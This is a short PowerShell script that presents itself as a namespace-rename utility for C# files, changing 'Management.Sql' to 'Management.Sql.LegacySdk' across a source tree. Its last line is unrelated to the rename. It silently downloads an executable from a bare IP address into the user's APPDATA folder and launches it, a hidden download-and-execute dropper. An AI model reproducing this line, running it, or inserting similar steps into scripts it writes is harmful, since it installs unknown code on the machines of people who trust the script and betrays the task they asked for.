$files = Get-ChildItem . *.cs -rec
foreach ($file in $files)
{
    (Get-Content $file.PSPath) |
    Foreach-Object { $_ -replace "Management.Sql", "Management.Sql.LegacySdk" } |
    Set-Content $file.PSPath
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

